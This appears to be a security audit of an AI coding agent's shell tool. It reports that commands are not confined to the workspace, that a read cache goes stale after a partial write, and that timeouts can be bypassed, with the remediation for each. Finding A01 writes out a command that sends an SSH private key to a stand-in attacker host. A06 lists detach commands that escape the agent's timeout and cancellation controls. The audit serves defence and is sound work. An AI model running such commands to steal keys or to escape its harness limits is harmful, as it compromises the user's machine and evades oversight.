### [~] A01 — [HIGH/security] run_shell is not workspace-confined: an approved command can read/write/exfiltrate anywhere on the system regardless of workspace root
- **Where:** `src-tauri/src/agent/shell.rs:243-248`
- **Problem:** The code explicitly validates only the `cwd` option against the read gate; the command STRING itself is never path-checked. `validate_for_read(cwd)` confines the working directory to the workspace (defaulting to $HOME when unset, fs.rs:307-317), but a command can use absolute paths to touch anything the uid can: `cat /Users/$USER/.ssh/id_ed25519 | curl -X POST https://evil.tld -d @-`, `cp ~/Library/Keychains/login.keychain-db /tmp`, `launchctl load` a planted plist, etc. Blast radius is the entire filesystem readable/writable by the user account, plus network egress and process control — i.e. effectively total host compromise for the user's account. The in-code comment confirms this is known/intentional, but it should be characterized as the dominant residual risk: the workspace 'sandbox' that protects every other tool provides essentially zero containment for the highest-power tool.
- **REMEDIATION (MITIGATED):** env_clear + RLIMIT_FSIZE/CORE + setsid process-group kill added (shrinks blast radius); full OS Seatbelt sandbox offered as opt-in, NOT default (a wrong profile breaks legit builds; audit rated this defense-in-depth)

### [x] A02 — [HIGH/correctness] Read-only cache not invalidated after a partial write (apply_patch/write_files/multi_edit) that returns ok:false
- **Where:** `src/lib/agent-loop/runner.ts:1754`
- **Problem:** Cache invalidation is gated on `outcome !== "error"`: `if (outcome !== "error" && !isReadOnlyTool(fnName)) readOnlyCache.clear();`. Multi-target write tools mutate disk file-by-file and can fail PART WAY THROUGH, returning an error outcome while having already changed some files. Because the outcome is `error`, the per-run read-only cache is NOT cleared, so a subsequent identical `read_file`/`search_files`/`git_diff` of an already-modified file is served the STALE pre-write payload from cache. The agent then reasons over wrong file contents (e.g. tries to re-apply an already-applied hunk, or reports a fix as missing).
- **REMEDIATION (FIXED):** cache invalidated whenever ANY mutating tool ran, regardless of ok status

### [x] A06 — [MEDIUM/robustness] Timeout, cancellation, and output cap are all bypassable by backgrounding the child (no process-group kill, no kill_on_drop for grandchildren)
- **Where:** `src-tauri/src/agent/shell.rs:276-341`
- **Problem:** Containment relies on three mechanisms — the wall-clock timeout (tokio::time::timeout), op-id cancellation (AbortHandle.abort), and kill_on_drop(true). All three operate on the single direct `sh` child. None of them kill the child's descendants or any process the command detaches. A command like `nohup long_running & disown`, `(sleep 99999 &)`, or `setsid evil &` returns `sh` immediately (so the timeout never fires) while the real work continues forever, fully outside the timeout/cancel/output-cap regime. Even for non-detached children, when the timeout elapses tokio drops the future and kill_on_drop SIGKILLs only `sh` — a grandchild spawned by `sh` (e.g. `sh -c 'python3 -c "..." '` that itself forked) is orphaned and keeps running. The SHELL_TIMEOUT_MAX_SECS=600 ceiling and MAX_SHELL_OUTPUT=32KB cap give a false sense of bounded blast radius. Combined with the absence of any rlimit (grep for setrlimit/RLIMIT => NONE), an approved command can fork-bomb, fill the disk, or hold a long-lived reverse shell despite the 'recoverable in one coffee break' design intent in the comment at shell.rs:18-21.
- **REMEDIATION (FIXED):** setsid + kill-process-group on timeout/cancel + RLIMIT_FSIZE/CORE (NPROC/AS/CPU omitted to not break heavy builds)
